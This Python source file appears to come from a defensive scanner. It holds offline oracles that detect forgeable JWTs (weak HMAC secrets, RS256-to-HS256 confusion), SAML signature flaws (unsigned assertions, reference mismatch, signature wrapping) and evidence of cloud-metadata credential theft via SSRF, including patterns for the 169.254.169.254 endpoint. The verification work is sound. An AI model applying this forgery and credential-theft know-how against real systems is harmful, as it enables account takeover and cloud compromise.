                kind=kind, fired=False, confidence=0.0,
                evidence=(f"{alg} signing input exceeds {_JWT_SIGNING_INPUT_CAP} bytes — not a plausible "
                          f"JWT; declining the HMAC recompute (stays a lead)"),
                observed={"alg": alg, "signing_input_len": len(parts[0]) + 1 + len(parts[1])})
        signing_input = f"{parts[0]}.{parts[1]}".encode("ascii", "ignore")
        target_sig = parts[2]
        for cand in (*candidate_keys, *_WEAK_HS_SECRETS):
            secret = cand if isinstance(cand, bytes) else _coerce_text(cand).encode("utf-8")
            recomputed = base64.urlsafe_b64encode(
                hmac.new(secret, signing_input, hasher).digest()).rstrip(b"=").decode("ascii")
            if hmac.compare_digest(recomputed, target_sig):
                cand_text = cand.decode("utf-8", "replace") if isinstance(cand, bytes) else _coerce_text(cand)
                if _looks_like_public_key(cand_text):
                    return OracleSignal(
                        kind=kind, fired=True, confidence=0.99,
                        evidence=(f"RS256->HS256 algorithm confusion: the {alg} signature reproduces with "
                                  f"the supplied RSA/EC PUBLIC key as the HMAC secret — public material "
                                  f"anyone holds forges accepted tokens (re-verify: "
                                  f"HMAC-{alg}(pubkey, header.payload) == signature)"),
                        observed={"proof": "rs256_hs256_confusion", "alg": alg,
                                  "hmac_key_is_public_key": True})
                return OracleSignal(
                    kind=kind, fired=True, confidence=0.99,
                    evidence=(f"{alg} signature RECOMPUTABLE from a weak/known secret {cand_text!r} — the "
                              f"exact HMAC reproduces, so whoever holds this secret forges arbitrary "
                              f"tokens (re-verify: HMAC-{alg}({cand_text!r}, header.payload) == signature)"),
                    observed={"proof": "hs256_weak_key", "alg": alg, "recovered_key": cand_text})
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"{alg} signature not reproducible from any supplied/weak candidate key — the secret "
                      f"is not recoverable, so no structural-forgery proof (stays a lead)"),
            observed={"alg": alg, "candidates_tried": len(candidate_keys) + len(_WEAK_HS_SECRETS)})

    # A normal RS256/ES256/... token (an asymmetric signature, never an HMAC) — forging it needs the
    # PRIVATE key, which the token alone cannot yield. Correctly NOT a structural-forgery proof.
    #
    # DELIBERATELY NOT a fire path: an EMBEDDED verification key (a `jwk` or `x5c` header whose key
    # verifies the token). It is tempting to call that "self-signed, forgeable" (RFC 8725 §3.5), but an
    # adversarial review proved it is NOT offline-provable as a forgery: a legitimate CA-chained `x5c`
    # (the RFC 7515 §4.1.6 norm — the leaf IS the cert whose key signed the JWS) verifies identically to
    # a self-signed one, and legitimate flows embed a self-verifying `jwk` by design (DPoP proofs,
    # SIOP id_tokens). Whether the relying party WRONGLY trusts the embedded key over a proper trust
    # anchor is unknowable from the token alone — so firing here would false-positive on real Azure/
    # enterprise/DPoP tokens. It is a belief-raising RISK INDICATOR at most (a future AEGIS lead), never
    # a confirmed FACT. (`jku`/`x5u` URL-fetch headers are likewise leads — an offline oracle can't fetch.)
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence=(f"alg={alg or '?'!r}: an asymmetric signature requires the private key to forge — not "
                  f"structurally forgeable from the token alone (stays a lead)"),
        observed={"alg": alg})


# ---------------------------------------------------------------------------
# Workstream NW-1 — the SAML structural-forgery oracle (the SAML_STRUCTURAL_FORGERY kind).
#
# The SSO SIBLING of jwt_forgery_oracle and the OFFLINE STRUCTURAL COMPLEMENT to the LIVE response-
# differential SAML checks in scanner.sso (SamlSignatureWrappingCheck / SamlAssertionTamperingCheck):
# those forge an artifact and observe ACCEPTANCE against a running SP; this judges a CAPTURED SAML
# Response's own XML ALONE — offline, deterministic, ZERO forged traffic — and promotes it to
# STRUCTURALLY-FORGEABLE only on a coarse, c14n-free STRUCTURAL invariant a VALIDLY SIGNED assertion
# cannot exhibit. It is the dual of scanner.sso.wrap_assertion_xsw.
#
#   (a) unsigned assertion   — the saml:Assertion carrying the consumed NameID has ZERO ds:Signature
#       anywhere in the message. An unsigned assertion needs no key, so anyone mints it.
#   (b) reference mismatch   — every ds:Reference/@URI points at some id OTHER than the consumed
#       assertion or any of its ancestors: the signature does NOT cover the consumed element, so its
#       content is swappable while a valid-looking signature rides along.
#   (c) signature-wrapping   — >1 saml:Assertion where the UNSIGNED consumed one supplies the identity
#       while a ds:Signature references a DIFFERENT assertion (the exact dual of wrap_assertion_xsw:
#       signed original kept verbatim, unsigned forged copy consumed).
#
# Near-zero-FP: a properly signed single assertion whose ds:Reference covers it (or an ancestor), a
# SAML metadata / request doc with no consumed NameID, malformed/empty XML, and a DOCTYPE/ENTITY doc
# (refused by the XXE-safe parser) all DO NOT fire. Full XML-DSig C14N/transform processing is
# deliberately NOT attempted (it needs lxml/signxml, out of scope) — anything softer than these coarse
# invariants stays a lead. Pure + deterministic (no clock/rng/io beyond the pure XXE-safe parse), so a
# confirmed forgery re-verifies OFFLINE from its retained XML certificate.
# NOTE: scanner.sso's XXE-safe parser + tree helpers are imported LAZILY inside the function — that
# module imports verify.adapter, so a module-load `verify -> scanner` import would be a cycle. The
# lazy import runs only when the oracle fires (never on the gate path), so no cycle and no gate drift.
# ---------------------------------------------------------------------------


# A ds:Reference/@URI of the form `#xpointer(id('X'))` — a spec-legal same-document XML-Signature
# reference (xmldsig-core 4.4.3) that selects element X by id, EQUIVALENT to the bare `#X` shorthand.
_SAML_XPTR_ID_RE = re.compile(r"^xpointer\(\s*id\(\s*(['\"])(?P<id>.+?)\1\s*\)\s*\)$")
# a whole-document XPointer `#xpointer(/)` — equivalent to URI="" (the enveloped whole-doc reference).
_SAML_XPTR_ROOT_RE = re.compile(r"^xpointer\(\s*/\s*\)$")
# a plain bare-name reference `#NCName` (no parens / slashes / xpointer) we can resolve to an id.
_SAML_BARENAME_RE = re.compile(r"^[A-Za-z_][\w.\-]*$")


def _saml_resolve_ref(uri: str) -> tuple[str, str | None]:
    """Resolve a ds:Reference/@URI to ('whole', None) | ('id', <name>) | ('unknown', None).

    Only same-document forms whose covered id/scope is UNAMBIGUOUS from the URI STRING are resolved:
    URI="" and `#xpointer(/)` (whole document), `#NCName` and `#xpointer(id('NCName'))` (that id).
    Everything else — a URI-less/transform-selected reference, an XPath/full-XPointer expression, a
    cross-document URI — is 'unknown': the oracle then REFUSES to assert a coverage mismatch on it
    (near-zero-FP; c14n/transform semantics are deliberately out of scope, so a reference we cannot
    resolve is NOT evidence the signature fails to cover the consumed element)."""
    if uri == "":
        return ("whole", None)
    if not uri.startswith("#"):
        return ("unknown", None)
    frag = uri[1:].strip()
    if _SAML_XPTR_ROOT_RE.match(frag):
        return ("whole", None)
    m = _SAML_XPTR_ID_RE.match(frag)
    if m:
        return ("id", m.group("id"))
    if _SAML_BARENAME_RE.match(frag):
        return ("id", frag)
    return ("unknown", None)


# ---------------------------------------------------------------------------
# OPT-IN cryptographic XML-DSig escalation (the `saml` extra). Mirrors jwt_forgery_oracle's
# candidate_keys: it runs ONLY when the operator supplies a TRUSTED IdP cert AND `signxml` is
# importable. It NEVER runs on the gate path (no benchmark carries saml_xml, let alone a trusted
# cert), so the structural oracle stays byte-identical when this branch is dormant.
#
# THE HARD FP LINES this helper holds (near-zero-FP is cardinal — a valid, trusted-key-signed
# assertion must NEVER read as a forgery):
#   1. NEVER trust the EMBEDDED cert. The signature's own ds:X509Certificate (KeyInfo) is attacker-
#      controlled — a self-signed forgery "verifies" against it. We pin verification to the
#      OPERATOR-PROVIDED trusted PEM via signxml's `x509_cert=` (confirmed: supplying x509_cert
#      overrides the document's embedded KeyInfo as the trust anchor). No trusted cert -> DORMANT.
#   2. REFUSE-TO-ADJUDICATE on can't-verify. We FIRE only on signxml's DEFINITIVE cryptographic-
#      invalidity exceptions — InvalidSignature ("Signature verification failed", wrong signer) and
#      its subclass InvalidDigest ("Digest mismatch", tampered content). We REFUSE (stay structural)
#      on InvalidCertificate (a subclass of InvalidSignature — cert trust/expiry, NOT a bad signature),
#      InvalidInput (a ValueError — no signature / unsupported SignatureMethod / transform), a parse
#      error, or ANY other exception. "Couldn't verify" is NOT "forged". signxml's mature c14n does the
#      canonicalization — we never hand-roll it.
#   3. A REFERENCE-COUNT mismatch is POLICY, not crypto-invalidity. signxml's default
#      SignatureConfiguration pins `expect_references=1`, so a spec-legal multi-reference / dual-signed
#      (Response AND Assertion both signed) doc — a GENUINELY valid signature — raises InvalidSignature
#      ("Expected to find 1 references, but found N"). We verify with `expect_references=False` so that
#      benign shape verifies instead of firing; the STRUCTURAL branch (not signxml's count) is where we
#      reason about which element a reference covers (XSW). Relaxing the count is strictly FP-REDUCING:
#      it can only prevent a false invalid, never manufacture one.
#   4. WHITESPACE / CAPTURE FIDELITY. Exclusive-C14N does NOT normalize inter-element whitespace text
#      nodes (significant per XML-DSig), so a valid assertion pretty-printed / re-indented in capture
#      (xmllint --format, browser devtools, SAML-tracer) raises InvalidSignature/InvalidDigest. Before
#      calling a raw definitive-invalid a forgery we RE-VERIFY a whitespace-normalized form
#      (`_saml_ws_normalized`); if THAT verifies, a trusted key signed it (capture artifact, NOT forgery)
#      -> verified. Stripping only inter-element whitespace can heal a whitespace false-invalid but can
#      never hide a content-tamper (that is not a whitespace difference), so no true positive is lost.
_SAML_CRYPTO_INPUT_CAP = 5 * 1024 * 1024   # bound the XML fed to signxml/lxml (DoS-safe over untrusted input)


def _saml_ws_normalized(text: str) -> str | None:
    """Re-serialize ``text`` with inter-element indentation whitespace stripped (lxml
    ``remove_blank_text``), or ``None`` if it will not parse. This reconstructs the canonical form a
    signature covered when the captured bytes were merely pretty-printed / re-indented, so a crypto
    re-verify of THIS form separates a whitespace/capture artifact (re-verifies) from a genuine forgery
    (still fails). Stripping removes only whitespace-ONLY text nodes BETWEEN elements — never element
    text content (base64 SignatureValue/DigestValue/X509Certificate survives) and never non-whitespace
    — so it can HEAL a whitespace-induced false-invalid but can NEVER hide a content-tamper forgery.
    XXE-safe (``resolve_entities=False``, ``no_network=True``); the caller already refused DTD/ENTITY."""
    try:
        from lxml import etree  # noqa: PLC0415 (signxml pulls in lxml; present iff the crypto branch runs)
        parser = etree.XMLParser(remove_blank_text=True, resolve_entities=False, no_network=True)
        return etree.tostring(etree.fromstring(text.encode("utf-8", "replace"), parser)).decode("utf-8", "replace")
    except Exception:
        return None


def _saml_verify_one(text: str, pem: str, verifier: Any, cfg: Any, sx_ex: Any) -> tuple[str, str]:
    """Classify ONE (cert, xml) crypto verification as ``(classification, detail)`` where classification
    is ``"verified"`` | ``"definitive"`` | ``"indeterminate"``.

      * ``verified``      — the trusted cert cryptographically verifies the signature.
      * ``definitive``    — a DEFINITIVE cryptographic invalidity (InvalidSignature / InvalidDigest:
        wrong signer / tampered digest). This is the ONLY fire-eligible outcome.
      * ``indeterminate`` — InvalidCertificate (cert trust/expiry, NOT a bad sig), InvalidInput /
        unsupported-algorithm / unsupported-transform / parse / config error, or anything else
        ("couldn't verify" — never "forged").

    ``cfg`` relaxes signxml's ``expect_references`` COUNT policy (FP line 3) so a spec-legal
    multi-reference / dual-signed doc verifies instead of raising a spurious InvalidSignature."""
    try:
        verifier().verify(text, x509_cert=pem, expect_config=cfg)
        return ("verified", "")
    except sx_ex.InvalidCertificate as e:   # subclass of InvalidSignature — cert trust/expiry, NOT a bad sig
        return ("indeterminate", f"cert_untrusted:{type(e).__name__}")
    except (sx_ex.InvalidDigest, sx_ex.InvalidSignature) as e:   # DEFINITIVE cryptographic invalidity
        return ("definitive", f"{type(e).__name__}: {str(e)[:160]}")
    except Exception as e:   # InvalidInput / unsupported alg-or-transform / parse / config / anything
        return ("indeterminate", f"indeterminate:{type(e).__name__}")


def _saml_crypto_verdict(text: str, candidate_certs: Sequence[str]) -> tuple[str, str, dict[str, Any]]:
    """Cryptographically verify the captured SAML XML's XML-DSig signature against the OPERATOR-SUPPLIED
    TRUSTED cert(s), returning ``(verdict, detail, observed_extra)`` where verdict is one of:

      * ``"unavailable"`` — no trusted cert supplied, or ``signxml`` is not importable. The crypto branch
        is DORMANT; the oracle stays structural-only (byte-identical).
      * ``"verified"``    — at least one trusted cert cryptographically verifies the signature. The
        signature was produced by a trusted IdP key (NOT a forgery on that dimension).
      * ``"invalid"``     — no trusted cert verifies, AND every failure was a DEFINITIVE cryptographic
        invalidity (InvalidSignature / InvalidDigest) with ZERO indeterminate outcomes: the signature is
        provably NOT from any trusted key (wrong signer / tampered digest). This is the fire signal.
      * ``"refuse"``      — could not conclusively adjudicate (an InvalidCertificate trust/expiry outcome,
        an InvalidInput / unsupported-algorithm / unsupported-transform / parse / config error, or any
        other exception on at least one cert). "Couldn't verify" is NOT "forged" — the oracle refuses.

    Pure w.r.t. its inputs and deterministic (signxml verification of fixed bytes against a fixed cert is
    reproducible), so a fire re-verifies OFFLINE from the retained XML + trusted certs. NEVER raises.

    FP guards 3 (relax `expect_references` — a reference-COUNT mismatch is policy, not crypto-invalidity)
    and 4 (a raw definitive-invalid is re-checked against a WHITESPACE-NORMALIZED form before it is
    called a forgery — a pretty-print/capture artifact re-verifies) are applied per the module note."""
    certs = [c for c in (_coerce_text(x) for x in (candidate_certs or ())) if c.strip()]
    if not certs:
        return ("unavailable", "no operator-supplied trusted cert — crypto branch dormant", {})
    try:  # guarded import (opt-in `saml` extra) — absent => dormant, structural-only
        from signxml import SignatureConfiguration, XMLVerifier  # noqa: PLC0415
        from signxml import exceptions as sx_ex  # noqa: PLC0415
    except Exception:  # pragma: no cover - exercised via monkeypatch in tests
        return ("unavailable", "signxml not importable (opt-in 'saml' extra absent)", {})

    # XXE + DoS re-guard (defense-in-depth; the oracle's upstream safe_parse_xml already enforced this,
    # so a DOCTYPE/ENTITY/oversize doc never reaches here — but keep the helper self-contained + safe).
    raw = text.encode("utf-8", "replace")
    if len(raw) > _SAML_CRYPTO_INPUT_CAP:
        return ("refuse", f"XML exceeds the {_SAML_CRYPTO_INPUT_CAP}-byte crypto bound — declining", {})
    low = raw.lower()
    if b"<!doctype" in low or b"<!entity" in low:
        return ("refuse", "DTD/ENTITY present — declining crypto verify (XXE-safe)", {})

    # FP line 3: a reference-COUNT mismatch is policy, not crypto-invalidity — accept any count so a
    # spec-legal multi-reference / dual-signed doc verifies instead of firing a spurious InvalidSignature.
    cfg = SignatureConfiguration(expect_references=False)
    # FP line 4: the whitespace/capture-fidelity re-check form (built once, reused per cert).
    norm = _saml_ws_normalized(text)

    definitive = 0
    indeterminate = 0
    first_invalid = ""
    outcomes: list[str] = []
    for pem in certs:
        # x509_cert pins the trust anchor to the OPERATOR's cert and OVERRIDES the document's own embedded
        # KeyInfo cert (FP line 1). Success => a trusted key signed it.
        cls, detail = _saml_verify_one(text, pem, XMLVerifier, cfg, sx_ex)
        if cls == "verified":
            return ("verified", "signature verifies against a supplied trusted cert",
                    {"crypto_outcome": "verified", "trusted_certs": len(certs)})
        if cls == "definitive" and norm is not None and norm != text:
            # FP line 4: a raw definitive-invalid MIGHT be only whitespace/pretty-print disturbance.
            # Re-verify the whitespace-normalized form before calling it a forgery.
            cls2, detail2 = _saml_verify_one(norm, pem, XMLVerifier, cfg, sx_ex)
            if cls2 == "verified":   # a trusted key DID sign it — the raw failure was capture whitespace
                return ("verified", "signature verifies against a supplied trusted cert (whitespace-normalized)",
                        {"crypto_outcome": "verified", "trusted_certs": len(certs), "note": "ws_normalized"})
            if cls2 != "definitive":   # normalized form is not conclusively invalid -> refuse for this cert
                cls, detail = "indeterminate", f"ws_indeterminate:{detail2}"
            # else: still definitive under BOTH the raw AND the whitespace-normalized form -> genuine.
        if cls == "definitive":
            definitive += 1
            if not first_invalid:
                first_invalid = detail
            outcomes.append(f"definitive_invalid:{detail[:48]}")
        else:
            indeterminate += 1
            outcomes.append(detail or "indeterminate")

    # FIRE only when EVERY trusted cert gave a conclusive "not signed by this key" (under BOTH the raw and
    # the whitespace-normalized form) AND nothing was indeterminate. A single indeterminate outcome (a
    # cert we could not evaluate — it MIGHT be the real signer) forces a REFUSE: "couldn't verify" is
    # never "forged".
    if definitive >= 1 and indeterminate == 0:
        return ("invalid", first_invalid,
                {"crypto_outcome": "invalid_signature", "trusted_certs": len(certs),
                 "signxml_error": first_invalid, "outcomes": outcomes})
    return ("refuse",
            f"inconclusive crypto verify ({definitive} definitive-invalid, {indeterminate} indeterminate)",
            {"crypto_outcome": "refuse", "trusted_certs": len(certs), "outcomes": outcomes})


def saml_forgery_oracle(xml: Any, *, candidate_certs: Sequence[str] = ()) -> OracleSignal:
    """Fire (SAML_STRUCTURAL_FORGERY) iff the captured SAML Response ``xml`` exhibits a coarse, c14n-free
    STRUCTURAL forgery invariant a validly signed assertion cannot: (a) the assertion carrying the
    consumed NameID has ZERO ds:Signature; (b) every ds:Reference/@URI points at an id OTHER than the
    consumed assertion or an ancestor (the signature does not cover the consumed element); or (c) the
    signature-wrapping shape (>1 assertion, the unsigned consumed one supplies the identity while a
    signature references a DIFFERENT assertion — the dual of scanner.sso.wrap_assertion_xsw). A properly
    signed single assertion, a doc with no consumed NameID, malformed/empty XML, and a DOCTYPE/ENTITY doc
    (XXE-refused) all DO NOT fire (near-zero-FP). Pure + deterministic; re-verifies offline from the XML.

    OPT-IN cryptographic escalation: when ``candidate_certs`` (the OPERATOR-PROVIDED TRUSTED IdP PEM
    cert(s)) is supplied AND ``signxml`` is importable, the structural NON-FIRE paths (a signature that
    structurally COVERS the consumed element, or a coverage picture this oracle cannot string-decide) are
    ADDITIONALLY escalated to a real XML-DSig verification against those trusted anchors — firing
    (proof=``invalid_signature``) ONLY when the signature is DEFINITIVELY cryptographically invalid
    (wrong signer / tampered digest). The signature's OWN embedded ds:X509Certificate is NEVER trusted
    (attacker-controlled), and a signature signxml cannot verify (unsupported transform/algorithm, cert
    trust/expiry, parse/config error) is REFUSED, not fired. No trusted cert (or signxml absent) => the
    escalation is DORMANT and this stays byte-identical to the structural-only oracle."""
    kind = OracleKind.SAML_STRUCTURAL_FORGERY
    # Lazy import (see the module-note above) — a parse error at import stays a non-fire, never a raise.
    try:
        from ..scanner.sso import (  # noqa: PLC0415 (intentional lazy import to avoid a cycle)
            XxeBlocked,
            _NS_ASSERT,
            _NS_DS,
            _parent_map,
            safe_parse_xml,
            saml_nameid,
        )
    except Exception:  # pragma: no cover - defensive; the helpers ship with the package
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="SAML parse helpers unavailable — cannot adjudicate")

    text = xml if isinstance(xml, str) else _coerce_text(xml)

    def _crypto_escalation() -> OracleSignal | None:
        """The opt-in XML-DSig escalation, evaluated ONLY at the structural NON-FIRE points below. Returns
        a fired signal iff the signature is DEFINITIVELY cryptographically invalid against a trusted cert;
        otherwise None (verified / refuse / dormant) so the caller returns the structural verdict
        unchanged. With no candidate_certs it short-circuits to 'unavailable' -> None -> byte-identical."""
        verdict, detail, extra = _saml_crypto_verdict(text, candidate_certs)
        if verdict != "invalid":
            return None
        return OracleSignal(
            kind=kind, fired=True, confidence=0.97,
            evidence=(
                "cryptographic XML-DSig verification: the ds:Signature is DEFINITIVELY INVALID against the "
                f"operator-supplied trusted cert(s) — {detail} — a forged/tampered signature no trusted IdP "
                "key produced (re-verify: signxml XMLVerifier.verify(xml, x509_cert=trusted_pem) raises "
                "InvalidSignature/InvalidDigest; the document's OWN embedded KeyInfo cert is NOT the anchor)"),
            observed={"proof": "invalid_signature", **extra})

    try:
        # XXE-safe: refuses any DOCTYPE/ENTITY + bounds size; a malicious-entity doc never resolves.
        root = safe_parse_xml(text)
    except XxeBlocked as exc:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=f"XML refused by the XXE-safe parser ({exc}) — non-fire",
                            observed={"parse": "refused"})
    except Exception as exc:  # any other parse failure — never raise, stay a lead
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence=f"XML not parseable ({type(exc).__name__}) — non-fire",
                            observed={"parse": "error"})

    ASSERT = f"{{{_NS_ASSERT}}}"
    DS = f"{{{_NS_DS}}}"

    # The consumed identity: scanner.sso.saml_nameid's first-NameID-with-text (what an SP that consumes
    # the first assertion authenticates as). No consumed identity -> nothing to adjudicate (metadata /
    # AuthnRequest / a doc with no NameID) -> non-fire.
    nameid_text = saml_nameid(root)
    if nameid_text is None:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no saml:NameID with text — no consumed SSO identity to adjudicate",
                            observed={"reason": "no_nameid"})
    consumed_nameid_el = next(
        (el for el in root.iter(f"{ASSERT}NameID") if el.text == nameid_text), None)

    pmap = _parent_map(root)

    def _ancestors(el: Any):
        cur = pmap.get(el)
        while cur is not None:
            yield cur
            cur = pmap.get(cur)

    # The saml:Assertion that ENCLOSES the consumed NameID (the consumed assertion). A NameID outside any
    # Assertion (e.g. a bare LogoutRequest subject) is not an authentication assertion -> non-fire.
    consumed_assertion = next(
        (a for a in _ancestors(consumed_nameid_el) if a.tag == f"{ASSERT}Assertion"), None)
    if consumed_assertion is None:
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence="the consumed saml:NameID is not inside a saml:Assertion — not an authentication "
                     "assertion (stays a lead)",
            observed={"reason": "nameid_outside_assertion"})

    assertions = list(root.iter(f"{ASSERT}Assertion"))
    signatures = list(root.iter(f"{DS}Signature"))

    def _id_of(el: Any) -> str | None:
        return el.get("ID") or el.get("AssertionID") or el.get("ResponseID")

    consumed_id = _id_of(consumed_assertion)

    # ---- invariant (a): NO signature anywhere over the consumed assertion --------------------------
    if not signatures:
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"the saml:Assertion (ID={consumed_id!r}) carrying the consumed NameID has ZERO "
                      f"ds:Signature in the whole message — an unsigned assertion is structurally "
                      f"forgeable (anyone can mint it; re-verify: 0 ds:Signature over {len(assertions)} "
                      f"assertion(s))"),
            observed={"proof": "unsigned_assertion", "assertions": len(assertions),
                      "signatures": 0, "consumed_assertion_id": consumed_id})

    # Signatures exist — determine whether ANY covers the consumed assertion or one of its ancestors.
    referenced_ids: set[str] = set()
    whole_doc_sig = False       # a ds:Reference URI="" / #xpointer(/) covers the WHOLE document
    unadjudicable_ref = False   # a reference we cannot resolve to a bare id/whole-doc (URI-less +
                                # transform-selected, XPath, full XPointer): its coverage is UNKNOWN, so
                                # we must NOT treat it as a mismatch (the review's XPointer/URI-less FP).
    for sig in signatures:
        for ref in sig.iter(f"{DS}Reference"):
            uri = ref.get("URI")
            if uri is None:
                unadjudicable_ref = True   # URI-less: selects nodes via Transforms — not string-decidable
                continue
            kind_ref, rid = _saml_resolve_ref(uri.strip())
            if kind_ref == "whole":
                whole_doc_sig = True
            elif kind_ref == "id":
                referenced_ids.add(rid)
            else:
                unadjudicable_ref = True

    consumed_chain_ids: set[str] = set()
    if consumed_id:
        consumed_chain_ids.add(consumed_id)
    for anc in _ancestors(consumed_assertion):
        aid = _id_of(anc)
        if aid:
            consumed_chain_ids.add(aid)

    covered = whole_doc_sig or bool(referenced_ids & consumed_chain_ids)
    if covered:
        # Structurally the signature covers the consumed element — but "covers by URI" is not "valid
        # crypto". If a trusted cert was supplied, escalate: a wrong-signer or tampered-digest forgery
        # that structurally looks properly signed is caught here (fire); anything short of a definitive
        # cryptographic invalidity leaves this the structural non-fire below (byte-identical when dormant).
        esc = _crypto_escalation()
        if esc is not None:
            return esc
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=("a ds:Signature covers the consumed assertion (or an ancestor) — properly signed "
                      "(stays a lead; c14n/transform validity is deliberately not asserted here)"),
            observed={"assertions": len(assertions), "signatures": len(signatures),
                      "consumed_assertion_id": consumed_id, "referenced_ids": sorted(referenced_ids),
                      "whole_doc_sig": whole_doc_sig})

    # NOT covered. Distinguish the wrapping shape (>1 assertion, a signed sibling) from a plain mismatch.
    other_ids: set[str] = set()
    for a in assertions:
        if a is not consumed_assertion:
            aid = _id_of(a)
            if aid:
                other_ids.add(aid)
    consumed_has_own_sig = any(True for _ in consumed_assertion.iter(f"{DS}Signature"))

    # ---- invariant (c): signature-wrapping shape (the dual of wrap_assertion_xsw) ------------------
    # Only when the reference set is FULLY resolvable — an unadjudicable (transform/xpath) reference
    # could be the one that actually covers the consumed assertion, so we refuse to assert wrapping.
    if len(assertions) >= 2 and not consumed_has_own_sig and not unadjudicable_ref and (referenced_ids & other_ids):
        signed_siblings = sorted(referenced_ids & other_ids)
        return OracleSignal(
            kind=kind, fired=True, confidence=0.95,
            evidence=(f"signature-wrapping: {len(assertions)} saml:Assertion elements — the UNSIGNED one "
                      f"(ID={consumed_id!r}) supplies the consumed NameID while a ds:Signature references "
                      f"a DIFFERENT assertion {signed_siblings} — the signed element is not the consumed "
                      f"one (re-verify: consumed id not in the signed Reference set)"),
            observed={"proof": "signature_wrapping", "assertions": len(assertions),
                      "consumed_assertion_id": consumed_id, "referenced_ids": sorted(referenced_ids),
                      "signed_sibling_ids": signed_siblings})

    # ---- invariant (b): ds:Reference/@URI does not cover the consumed element ----------------------
    # Fire ONLY when EVERY reference resolved to a bare id/whole-doc form (nothing unadjudicable) and
    # none of them covers the consumed chain. An unresolvable reference (transform/xpath) means the
    # coverage picture is incomplete — we cannot PROVE a mismatch, so we refuse (the review's FP: a
    # validly-signed assertion using `#xpointer(id('X'))` / `#xpointer(/)` / a URI-less transform ref).
    if consumed_chain_ids and referenced_ids and not unadjudicable_ref:
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"ds:Reference/@URI covers {sorted(referenced_ids)} but the consumed assertion and "
                      f"its ancestors are {sorted(consumed_chain_ids)} — DISJOINT, so no signature covers "
                      f"the consumed element (re-verify: reference set and consumed chain do not intersect)"),
            observed={"proof": "reference_mismatch", "assertions": len(assertions),
                      "consumed_chain_ids": sorted(consumed_chain_ids),
                      "referenced_ids": sorted(referenced_ids)})

    # Signatures present but coverage is not string-decidable — no by-id references, the consumed
    # assertion has no id to compare, OR at least one reference is a transform/xpath/full-XPointer form
    # this oracle deliberately does not parse (c14n out of scope). Refuse rather than guess (near-zero-FP).
    # But if a trusted cert was supplied, signxml's mature c14n may resolve exactly the transforms this
    # oracle punts on: escalate — fire on a definitive cryptographic invalidity, else stay this refusal.
    esc = _crypto_escalation()
    if esc is not None:
        return esc
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence=("no c14n-free structural forgery invariant holds (signatures present but no provable "
                  "reference mismatch / wrapping shape" +
                  ("; a transform/xpath/URI-less reference is present whose coverage this oracle does not "
                   "adjudicate" if unadjudicable_ref else "") + ") — inconclusive, stays a lead"),
        observed={"assertions": len(assertions), "signatures": len(signatures),
                  "consumed_assertion_id": consumed_id, "referenced_ids": sorted(referenced_ids),
                  "whole_doc_sig": whole_doc_sig, "unadjudicable_ref": unadjudicable_ref})


# ---------------------------------------------------------------------------
# E1 — SSRF/foothold -> IMDS/metadata credential capture (BUILD-PLAN §E1; the flagship
# exploitation-chain oracle). The DEFENSIVE-VERIFICATION dual of an attack: it CONFIRMS an ACHIEVED
# EFFECT — role/SA credentials were actually retrieved from the instance metadata endpoint AND proven
# usable — over a JSON-safe RETAINED capture ALONE (offline, ZERO network, NO exploitation code). It is
# NOT an attack runner: the live "reach 169.254.169.254, mint a token, call GetCallerIdentity" action is
# a SEPARATE WARDEN-A2-gated runner; THIS pure oracle is the sole authority over the evidence that runner
# retained and re-derives the same verdict, so a confirmed FACT re-verifies OFFLINE from its certificate
# with no target. Positive-evidence-only, near-zero-FP by construction: it fires ONLY on BOTH a
# structurally-valid credential FROM the metadata endpoint AND a retained confirming call that proves it
# authenticated. A retrieved-but-unconfirmed credential is a LEAD; a 401/timeout / a FAILED confirming
# call / a credential NOT from the metadata endpoint / a random blob / malformed evidence never fire.
_IMDS_STR_CAP = 8192
_IMDS_OBS_CAP = 512
# An AWS INSTANCE-ROLE access-key id: ONLY ``ASIA…`` at the EXACT documented length (ASIA + 16 = 20 chars)
# — the STS TEMPORARY shape IMDS issues (it always ships with a session Token). A long-term ``AKIA…`` key
# NEVER comes from IMDS (it carries no session token), so accepting it as an "IMDS capture" is a false
# attribution (audit B4 + round-2). The strict prefix+length + the mandatory Token bind the credential to
# the instance-metadata role-credential shape.
_IMDS_AWS_AKID = re.compile(r"^ASIA[0-9A-Z]{16}$")
_IMDS_AWS_ACCOUNT = re.compile(r"^[0-9]{12}$")
# The link-local IMDS endpoints. A captured AWS role credential's source must be a URL whose HOST resolves
# (canonically, incl. the SSRF IP encodings) to one of these IPs, with the credential-path marker as a
# bounded PATH SEGMENT — NOT a substring anywhere in the raw string. A userinfo-@ host, a query-param IP, a
# host that merely CONTAINS the IP (169.254.169.254.attacker.com), a creds file, a non-http(s) scheme, or a
# ``…/security-credentials-evil`` sibling path are NOT an IMDS reach.
_IMDS_AWS_IP = "169.254.169.254"
_IMDS_METADATA_IP = ipaddress.ip_address(_IMDS_AWS_IP)
# Native IPv6 metadata endpoints (documented, audit B6): AWS fd00:ec2::254, GCP fd20:ce::254. Provider-
# specific so an AWS source using GCP's IPv6 (or vice-versa) is not cross-validated.
_IMDS_AWS_METADATA_IPS = frozenset({_IMDS_METADATA_IP, ipaddress.ip_address("fd00:ec2::254")})
_IMDS_GCP_METADATA_IPS = frozenset({_IMDS_METADATA_IP, ipaddress.ip_address("fd20:ce::254")})
_IMDS_AWS_CRED_PATH = "iam/security-credentials"
# Only http/https denote a network reach; a captured metadata credential's source must use one (a ``file://``
# / scheme-relative / opaque source is not an IMDS reach, audit B4). Only the default IMDS ports are a reach.
_IMDS_URL_SCHEMES = frozenset({"http", "https"})
_IMDS_OK_PORTS = frozenset({None, 80, 443})
# GCP: ONLY the fully-qualified compute-metadata host (or a GCP metadata IP). The bare shorthost ``metadata``
# is REMOVED (round-2): it resolves only via a DNS search domain and can point elsewhere, so offline it is
# not proof of the metadata endpoint. Real endpoint:
# metadata.google.internal/computeMetadata/v1/instance/service-accounts/<sa>/token.
